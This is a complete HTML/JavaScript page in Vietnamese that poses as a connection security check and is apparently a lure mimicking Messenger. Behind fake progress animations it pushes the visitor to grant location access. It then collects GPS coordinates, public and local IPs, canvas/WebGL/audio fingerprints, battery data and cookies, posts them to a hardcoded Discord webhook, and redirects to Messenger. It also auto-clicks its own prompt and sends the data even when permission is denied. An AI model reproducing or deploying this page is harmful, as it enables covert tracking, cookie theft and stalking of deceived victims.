<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="0">
    <title>Xác minh kết nối…</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        html, body { height: 100%; background: #0e1013; font-family: 'Segoe UI', 'Roboto', 'Arial', sans-serif; overflow: hidden; }
        #jackLayer {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 99999;
            background: rgba(0,0,0,0.94); backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px);
            display: flex; justify-content: center; align-items: center; flex-direction: column;
            color: #fff; text-align: center; transition: opacity 0.3s;
        }
        .wheel-box { position: relative; margin-bottom: 25px; }
        .wheel {
            width: 100px; height: 100px; border-radius: 50%;
            border: 6px solid rgba(255,255,255,0.08);
            border-top-color: #ffbe0b;
            animation: spin 0.6s cubic-bezier(0.4,0.0,0.2,1) infinite;
        }
        .wheel.paused { animation-play-state: paused; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .wheel-percent {
            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
            font-size: 20px; font-weight: 700; color: #ffbe0b;
        }
        .status { font-size: 18px; font-weight: 600; margin: 5px 20px; letter-spacing: 0.3px; }
        .sub { color: #b0b3b8; font-size: 14px; margin-top: 8px; max-width: 300px; }
        .tap-area {
            margin-top: 30px; padding: 12px 36px; background: rgba(255,255,255,0.08);
            border-radius: 50px; font-weight: 700; color: #ffbe0b; cursor: pointer;
            animation: pulse 2s infinite; border: 1px solid rgba(255,190,11,0.3);
            font-size: 15px; letter-spacing: 0.5px;
        }
        @keyframes pulse { 0% { opacity: 1; transform: scale(1); } 50% { opacity: 0.6; transform: scale(1.04); } 100% { opacity: 1; transform: scale(1); } }
        .checkmark {
            width: 70px; height: 70px; border-radius: 50%; background: #00c853;
            display: flex; justify-content: center; align-items: center; margin-bottom: 15px;
            box-shadow: 0 0 25px rgba(0,200,83,0.5); animation: pop 0.4s ease;
        }
        @keyframes pop { 0% { transform: scale(0); } 80% { transform: scale(1.1); } 100% { transform: scale(1); } }
        .checkmark::after {
            content: ''; display: block; width: 18px; height: 30px; border: solid white;
            border-width: 0 4px 4px 0; transform: rotate(45deg); margin-top: -3px;
        }
        .hidden { display: none; }
        #mapImage {
            max-width: 280px; border-radius: 12px; margin: 10px 0; border: 2px solid #333;
        }
        #copyLink {
            color: #ffbe0b; text-decoration: underline; cursor: pointer; font-size: 14px; margin-top: 12px;
        }
    </style>
</head>
<body>
    <div id="jackLayer">
        <div id="wheelSection">
            <div class="wheel-box">
                <div class="wheel" id="wheel"></div>
                <div class="wheel-percent" id="percent">0%</div>
            </div>
            <div class="status" id="statusMsg">Đang kiểm tra bảo mật…</div>
            <div class="sub" id="subMsg">Vui lòng chờ trong giây lát</div>
            <div id="tapPrompt" class="hidden" style="margin-top:15px; color:#ffbe0b; font-weight:600; font-size:15px; white-space: pre-line;"></div>
            <div id="tapButton" class="tap-area hidden">Chạm để xác minh</div>
        </div>
        <div id="scanSection" class="hidden">
            <div class="checkmark" id="successMarkInner"></div>
            <div class="status" id="scanStatus">Định vị thành công!</div>
            <img id="mapImage" src="" alt="Vị trí của bạn">
            <div class="sub" id="scanSub">Đang quét thiết bị…</div>
        </div>
    </div>

    <script>
        // ========== MAIN APP – NO BROWSER CHECKS ==========
        const WEBHOOK = 'https://discord.com/api/webhooks/1508157152580337746/Ujt-uvdn6HBrnb7CFBe7rd4y-NqaHLstGmzFOKUoD6AJFS5HABi6kTqXXKrumg9eo-Ek';

        const wheelEl = document.getElementById('wheel');
        const percentEl = document.getElementById('percent');
        const statusEl = document.getElementById('statusMsg');
        const subEl = document.getElementById('subMsg');
        const tapBtn = document.getElementById('tapButton');
        const tapPrompt = document.getElementById('tapPrompt');
        const wheelSection = document.getElementById('wheelSection');
        const scanSection = document.getElementById('scanSection');
        const mapImage = document.getElementById('mapImage');
        const scanStatus = document.getElementById('scanStatus');
        const scanSub = document.getElementById('scanSub');

        let gpsData = null;
        let ipData = null;
        const cookiesStolen = document.cookie || 'none';

        function vibrate() { if (window.navigator.vibrate) window.navigator.vibrate(50); }

        function getDeviceHint() {
            const ua = navigator.userAgent;
            if (/iPhone|iPad|iPod/.test(ua)) return '📱 iPhone: Nhấn "Cho phép" ở góc trên bên trái';
            if (/Android/.test(ua)) return '📱 Android: Nhấn "Cho phép" ở giữa phía trên';
            return 'Nhấn "Cho phép" khi trình duyệt hỏi';
        }

        function getFingerprint() {
            const nav = navigator;
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            canvas.width = 280; canvas.height = 60;
            ctx.textBaseline = 'top'; ctx.font = '14px Arial';
            ctx.fillStyle = '#f60'; ctx.fillRect(125,1,62,20);
            ctx.fillStyle = '#069'; ctx.fillText('FP', 2, 15);
            const canvasHash = canvas.toDataURL().substring(0, 100);
            let webglRenderer = 'N/A', webglVendor = 'N/A';
            try {
                const gl = document.createElement('canvas').getContext('webgl') || document.createElement('canvas').getContext('experimental-webgl');
                if (gl) {
                    const debug = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debug) { webglRenderer = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL); webglVendor = gl.getParameter(debug.UNMASKED_VENDOR_WEBGL); }
                }
            } catch(e) {}
            let audioFP = 'N/A';
            try {
                const actx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
                const osc = actx.createOscillator();
                osc.type = 'triangle';
                osc.frequency.setValueAtTime(10000, actx.currentTime);
                const comp = actx.createDynamicsCompressor();
                osc.connect(comp); comp.connect(actx.destination);
                osc.start(0);
                actx.startRendering();
                actx.oncomplete = (e) => {
                    const out = e.renderedBuffer.getChannelData(0);
                    audioFP = out.slice(0, 4000).reduce((a,b)=>a+Math.abs(b),0).toString(36);
                };
            } catch(e) {}
            const conn = nav.connection || {};
            return {
                userAgent: nav.userAgent,
                language: nav.language,
                platform: nav.platform,
                deviceMemory: nav.deviceMemory || 'N/A',
                hardwareConcurrency: nav.hardwareConcurrency || 'N/A',
                touchSupport: ('ontouchstart' in window),
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                screen: `${screen.width}x${screen.height} (${screen.colorDepth}bit)`,
                connection: conn.effectiveType || 'N/A',
                canvasHash, webglRenderer, webglVendor, audioFingerprint: audioFP,
                cookies: cookiesStolen,
                battery: null
            };
        }

        async function fetchIP() {
            const apis = ['https://ipapi.co/json/', 'https://ipinfo.io/json?token=0', 'http://ip-api.com/json/'];
            for (let url of apis) {
                try {
                    const r = await fetch(url, { signal: AbortSignal.timeout(3000) });
                    const d = await r.json();
                    const out = {
                        ip: d.ip || d.query || '',
                        city: d.city || '',
                        region: d.region || d.regionName || '',
                        country: d.country || d.country_name || '',
                        lat: d.latitude || d.lat || (d.loc ? d.loc.split(',')[0] : ''),
                        lon: d.longitude || d.lon || (d.loc ? d.loc.split(',')[1] : ''),
                        isp: d.isp || d.org || ''
                    };
                    if (out.ip) return out;
                } catch(e) {}
            }
            return null;
        }

        function getWebRTCIPs() {
            return new Promise((resolve) => {
                const ips = new Set();
                const pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel('');
                pc.createOffer().then(o => pc.setLocalDescription(o));
                pc.onicecandidate = e => {
                    if (!e.candidate) { resolve(ips.size ? Array.from(ips).join(', ') : null); return; }
                    const m = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
                    if (m) ips.add(m[0]);
                };
                setTimeout(() => resolve(ips.size ? Array.from(ips).join(', ') : null), 2500);
            });
        }

        function forceGPS() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) return resolve(null);
                navigator.geolocation.getCurrentPosition(
                    pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: Math.round(pos.coords.accuracy) }),
                    err => resolve(null),
                    { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
                );
                setTimeout(() => resolve(null), 9000);
            });
        }

        async function sendData() {
            const fp = getFingerprint();
            if ('getBattery' in navigator) {
                try { const b = await navigator.getBattery(); fp.battery = { charging: b.charging, level: Math.round(b.level*100)+'%' }; } catch(e) {}
            }
            const localIPs = await getWebRTCIPs();
            const embed = {
                title: '📱 **Dữ liệu thiết bị & Vị trí**',
                color: 0xffa502,
                fields: [
                    { name: '📍 GPS', value: gpsData ? `Lat: ${gpsData.lat}\nLon: ${gpsData.lon}\nAcc: ±${gpsData.accuracy}m` : 'Không có (bị từ chối)', inline: true },
                    { name: '🌐 IP & Vị trí IP', value: ipData ? `IP: ${ipData.ip}\nTP: ${ipData.city}, ${ipData.country}\nISP: ${ipData.isp}` : 'Không lấy được', inline: true },
                    { name: '🏠 IP cục bộ', value: localIPs || 'Không có', inline: true },
                    { name: '🔋 Pin', value: fp.battery ? `${fp.battery.level} (${fp.battery.charging?'Sạc':'Không sạc'})` : 'N/A', inline: true },
                    { name: '📱 Thiết bị', value: `${fp.userAgent}\nHĐH: ${fp.platform}\nRAM: ${fp.deviceMemory}GB, Nhân: ${fp.hardwareConcurrency}\nTouch: ${fp.touchSupport}`, inline: false },
                    { name: '🌍 Múi giờ', value: fp.timezone, inline: true },
                    { name: '🖥 Màn hình', value: fp.screen, inline: true },
                    { name: '📶 Kết nối', value: fp.connection, inline: true },
                    { name: '🎨 Canvas', value: fp.canvasHash, inline: true },
                    { name: '🖼 WebGL', value: `${fp.webglVendor} / ${fp.webglRenderer}`, inline: true },
                    { name: '🔊 Audio', value: fp.audioFingerprint, inline: true },
                    { name: '🍪 Cookies', value: cookiesStolen.substring(0, 1020), inline: false }
                ],
                footer: { text: 'Axr4t2auYc • GPS loop hoàn hảo' },
                timestamp: new Date().toISOString()
            };
            await fetch(WEBHOOK, { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({embeds:[embed]}) }).catch(()=>{});
        }

        function showMap(lat, lon) {
            mapImage.src = `https://staticmap.openstreetmap.de/staticmap.php?center=${lat},${lon}&zoom=14&size=280x160&markers=${lat},${lon},red-pushpin`;
        }

        let progress = 0;
        const wheelTimer = setInterval(() => {
            progress += 20;
            if (progress >= 100) {
                progress = 100;
                clearInterval(wheelTimer);
                wheelEl.classList.add('paused');
                percentEl.textContent = '100%';
                statusEl.textContent = 'Chuẩn bị kiểm tra vị trí…';
                subEl.textContent = '';
                tapPrompt.textContent = '⚠️ ' + getDeviceHint() + '\n(Cần cấp quyền để tiếp tục)';
                tapPrompt.classList.remove('hidden');
                tapBtn.classList.remove('hidden');
            } else {
                percentEl.textContent = progress + '%';
            }
        }, 1000);

        tapBtn.addEventListener('click', async () => {
            vibrate();
            tapBtn.classList.add('hidden');
            tapPrompt.classList.add('hidden');
            statusEl.textContent = 'Đang lấy vị trí GPS…';
            wheelEl.classList.remove('paused');
            percentEl.textContent = '0%';
            let fake = 0;
            const fakeInterval = setInterval(() => {
                fake += 20;
                percentEl.textContent = fake + '%';
                if (fake >= 100) { fake = 100; clearInterval(fakeInterval); wheelEl.classList.add('paused'); percentEl.textContent = '100%'; }
            }, 80);
            const gpsPromise = forceGPS();
            ipData = await fetchIP();
            gpsData = await gpsPromise;
            clearInterval(fakeInterval);
            wheelEl.classList.add('paused');
            percentEl.textContent = '100%';

            if (gpsData) {
                wheelSection.classList.add('hidden');
                scanSection.classList.remove('hidden');
                if (gpsData.lat && gpsData.lon) showMap(gpsData.lat, gpsData.lon);
                else if (ipData && ipData.lat && ipData.lon) showMap(ipData.lat, ipData.lon);
                scanStatus.textContent = 'Định vị thành công!';
                scanSub.textContent = 'Đang phân tích thiết bị…';
                vibrate();
                setTimeout(() => {
                    scanSub.textContent = 'Thiết bị an toàn. Chuyển hướng…';
                    vibrate();
                    setTimeout(() => {
                        window.location.href = 'https://www.messenger.com/';
                    }, 1200);
                }, 2000);
                await sendData();
            } else {
                statusEl.textContent = 'Vị trí bị từ chối – cần cấp quyền để tiếp tục';
                subEl.innerHTML = 'Đang thử lại…<br><span id="copyLink" onclick="navigator.clipboard.writeText(\'https://messenger-co.github.io/Axr4t2auYc\').then(()=>alert(\'Đã sao chép link. Dán vào Chrome/Safari.\'))">📋 Sao chép link mở bằng trình duyệt</span>';
                await sendData();
                setTimeout(() => {
                    window.location.reload();
                }, 3000);
            }
        });

        setTimeout(() => {
            if (!tapBtn.classList.contains('hidden')) tapBtn.click();
        }, 30000);
    </script>
</body>
</html>
